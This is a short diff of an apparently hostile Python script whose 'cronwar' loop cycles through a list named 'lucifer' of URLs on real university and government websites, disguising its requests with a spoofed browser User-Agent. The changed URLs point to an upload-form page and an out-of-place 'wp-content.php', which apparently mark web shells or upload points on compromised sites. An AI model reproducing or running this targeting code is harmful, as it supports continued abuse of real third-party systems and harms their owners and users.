@@ -39,7 +39,7 @@ def cronwar():
 	while 1:
 		try:
    			lucifer = [
-   				"https://ppaa.fisip.ui.ac.id/perkuliahan/upload_mk_dosen_form7.php"
+   				"https://juanda.bkipm.kkp.go.id/demo/wp-content.php"
    				 ]
    			for x in lucifer:
    				Agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36'}
